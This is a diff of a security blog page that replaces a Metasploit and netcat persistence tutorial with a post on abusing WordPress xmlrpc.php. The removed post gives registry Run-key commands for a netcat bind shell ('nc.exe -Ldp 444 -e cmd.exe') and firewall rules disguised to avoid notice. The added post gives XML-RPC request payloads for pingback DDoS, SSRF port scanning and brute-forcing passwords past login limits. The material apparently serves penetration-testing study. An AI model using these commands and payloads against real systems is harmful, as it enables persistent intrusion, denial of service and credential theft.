@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="">
   <meta name="keywords" content="">
-  <title>MSF和NC永久后门植入 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
+  <title>wordpress中xmlrpc的利用 | Cheekkk&#39;s Anti-Gravity Galaxy</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
@@ -118,7 +118,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    656 字
+                    466 字
                   </span>
                 
 
@@ -157,107 +157,65 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <p>创建永久后门的方法</p>
+              <p>利用WordPress的xmlrpc进行ddos、SSRF与暴力破解</p>
 <a id="more"></a>
 
-<h1 id="MSF和NC永久后门植入"><a href="#MSF和NC永久后门植入" class="headerlink" title="MSF和NC永久后门植入"></a>MSF和NC永久后门植入</h1><ul>
-<li>为什么要植入后门？<ul>
-<li>Meterpreter Shell运行于内存之中，重启之后就将失效</li>
-<li>避免重复性的渗透工作</li>
-<li>漏洞修复后仍旧可以维持控制</li>
-<li>存在于内存中不读取磁盘文件，不易被发现</li>
-<li>有些漏洞多次利用后服务器或漏洞会损坏</li>
-</ul>
-</li>
-</ul>
-<h2 id="01-MSF后门"><a href="#01-MSF后门" class="headerlink" title="01 MSF后门"></a>01 MSF后门</h2><h3 id="metsvc后门"><a href="#metsvc后门" class="headerlink" title="metsvc后门"></a>metsvc后门</h3><ul>
-<li>使用run metsvc启动<ul>
-<li>-A 自动连接后门</li>
-<li>-h 查看帮助菜单</li>
-<li>-r 卸载已存的后门（文件要手动删除）</li>
-</ul>
-</li>
-</ul>
-<p><img src="1.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="2.png" srcset="/img/loading.gif" alt=""></p>
-<ul>
-<li>端口固定为31337，如果扫描发现31337打开，就很可能被植入过后门</li>
-<li>防火墙和UAC可能会影响后门</li>
-</ul>
-<h3 id="persistence后门"><a href="#persistence后门" class="headerlink" title="persistence后门"></a>persistence后门</h3><ul>
-<li>使用 run persistence -h 查看帮助菜单，如图</li>
-</ul>
-<p><img src="3.png" srcset="/img/loading.gif" alt=""></p>
-<ul>
-<li>比较重要的参数有：<ul>
-<li>-A 自动连接后门</li>
-<li>-P 设置payload，默认为 windows/meterpreter/reverse_tcp 默认32位，当目标机器为64位时将无法运行</li>
-<li>-U 设置后门在用户登录后自动启动，推荐使用</li>
-<li>-X 设置后门在用户登录后自动启动，在非管理员权限或未进行BypassUAC时不推荐使用</li>
-<li>-i 设置反向连接的时间间隔</li>
-<li>-p 设置反向连接的端口号</li>
-<li>-r 设置反向连接的IP地址</li>
-</ul>
-</li>
-</ul>
-<p>运行persistence后门，设置了时间间隔为20</p>
-<p><img src="4.png" srcset="/img/loading.gif" alt=""></p>
-<p>成功获取了Session，编号是21</p>
-<p><img src="5.png" srcset="/img/loading.gif" alt=""></p>
-<p>手动关闭获取的Session</p>
-<p><img src="6.png" srcset="/img/loading.gif" alt=""></p>
-<p>由于设置了i参数，20s后重新获得了Session，编号变成了22</p>
-<p><img src="7.png" srcset="/img/loading.gif" alt=""></p>
-<p>由于使用了-X参数，目标靶机重启后也会自动连接上Session</p>
-<h2 id="02-NC后门"><a href="#02-NC后门" class="headerlink" title="02 NC后门"></a>02 NC后门</h2><h3 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h3><ul>
-<li>上传nc<br>upload /root/nc.exe C:\\windows\system32</li>
-<li>修改注册表<ul>
-<li>枚举注册表键值<br>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</li>
-<li>在当前主键下增加一个nc键值<br>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d ‘C:\\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</li>
-<li>查看键值<br>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc</li>
-</ul>
-</li>
-<li>设置防火墙<ul>
-<li>开启一个cmd通道<br>Execute -f cmd -i -H</li>
-<li>查看防火墙状态<br>Netsh firewall show opmode</li>
-<li>添加防火墙规则允许444端口通过<br>Netsh firewall add portopening TCP 444 “Service Firewall” ENABLE</li>
-<li>查看端口状态<br>Netsh firewall show portopening</li>
-</ul>
-</li>
-<li>开始连接<br>nc -v ip port</li>
-</ul>
-<h3 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h3><p> 添加键值 -Ldp 444 -e cmd.exe 表示把cmd转发的444端口</p>
-<p><img src="8.png" srcset="/img/loading.gif" alt=""></p>
-<p>查看添加的键值</p>
-<p><img src="9.png" srcset="/img/loading.gif" alt=""></p>
-<p>登录到cmd</p>
-<p><img src="10.png" srcset="/img/loading.gif" alt=""></p>
-<p>直接关闭防火墙容易引起怀疑，可以将444端口伪装成正常的防火墙而不被过滤，不容易被发现</p>
-<p><img src="11.png" srcset="/img/loading.gif" alt=""></p>
-<p>靶机重启后自动运行了nc.exe,后门仍然有效<br>在kali中使用nc进行连接，获得shell</p>
-<p><img src="12.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="wordpress中xmlrpc的利用"><a href="#wordpress中xmlrpc的利用" class="headerlink" title="wordpress中xmlrpc的利用"></a>wordpress中xmlrpc的利用</h1><h2 id="00-利用pingback进行ddos攻击"><a href="#00-利用pingback进行ddos攻击" class="headerlink" title="00 利用pingback进行ddos攻击"></a>00 利用pingback进行ddos攻击</h2><p>pingback会自动向连接发送ping请求</p>
+<p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p>
+<pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;
+&lt;methodCall&gt;
+    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;
+    &lt;params&gt;
+    	&lt;param&gt;&lt;value&gt;		
+      &lt;string&gt;目标网站&lt;&#x2F;string&gt;
+      &lt;&#x2F;value&gt;&lt;&#x2F;param&gt;
+    &lt;&#x2F;params&gt;
+&lt;&#x2F;methodCall&gt;</code></pre>
+
+<p>需要注意的是出于测试目的需要在报头中加上</p>
+<pre><code class="hljs pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/<span class="hljs-type">xml</span></code></pre>
+<p>否则XML-RPC 服务会认为该请求不合法</p>
+<p><strong>可以将目标网站设为dnslog，用于获取wordpress站点的真实IP</strong></p>
+<h2 id="01-利用pingback进行SSRF"><a href="#01-利用pingback进行SSRF" class="headerlink" title="01 利用pingback进行SSRF"></a>01 利用pingback进行SSRF</h2><p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p>
+<pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;
+&lt;methodCall&gt;
+    &lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;
+    &lt;params&gt;
+    	&lt;param&gt;&lt;value&gt;		
+      &lt;string&gt;目标IP:端口&lt;&#x2F;string&gt;
+      &lt;&#x2F;value&gt;&lt;&#x2F;param&gt;
+    &lt;&#x2F;params&gt;
+&lt;&#x2F;methodCall&gt;</code></pre>
+
+<p>根据返回包判断端口开放情况</p>
+<h2 id="02-利用getUsersBlogs进行暴力破解"><a href="#02-利用getUsersBlogs进行暴力破解" class="headerlink" title="02 利用getUsersBlogs进行暴力破解"></a>02 利用getUsersBlogs进行暴力破解</h2><p>通常wordpress登录接口都是做了防暴力破解防护的，利用xmlrpc.php提供的接口尝试猜解用户的密码，可以绕过wordpress对暴力破解的限制</p>
+<p>使用POST方法，向xmlrpc.php页面发送请求，提交以下表单</p>
+<pre><code class="hljs php+HTML">POST http:&#x2F;&#x2F;域名&#x2F;xmlrpc.php
+&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;iso-8859-1&quot;?&gt;
+&lt;methodCall&gt;
+    &lt;methodName&gt;wp.getUsersBlogs&lt;&#x2F;methodName&gt;
+    &lt;params&gt;
+    	&lt;param&gt;&lt;value&gt;username&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;	
+      &lt;param&gt;&lt;value&gt;password&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;
+    &lt;&#x2F;params&gt;
+&lt;&#x2F;methodCall&gt;</code></pre>
+
+<p>根据返回包判断爆破结果</p>
 
             </article>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-                    
-                  </div>
-                
                 
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
                     
-                      <a class="hover-with-bg" href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
-                    
-                      <a class="hover-with-bg" href="/tags/MSF/">MSF</a>
+                      <a class="hover-with-bg" href="/tags/WordPress/">WordPress</a>
                     
                   </div>
                 
@@ -270,9 +228,9 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/%E4%BD%BF%E7%94%A8MSF%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                      <a href="/mimikatz%E4%B8%AD%E5%93%88%E5%B8%8C%E4%B8%8E%E7%A5%A8%E6%8D%AE%E6%93%8D%E4%BD%9C/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">使用MSF进行内网渗透</span>
+                        <span class="hidden-mobile">mimikatz中哈希与票据操作</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -280,8 +238,8 @@
                   <div class="post-next col-6">
                     
                     
-                      <a href="/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/">
-                        <span class="hidden-mobile">Linux常用命令</span>
+                      <a href="/tomcat-AJP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPUT%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">tomcat AJP文件包含漏洞与PUT写文件漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -421,7 +379,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "MSF和NC永久后门植入&nbsp;",
+        "wordpress中xmlrpc的利用&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 40,
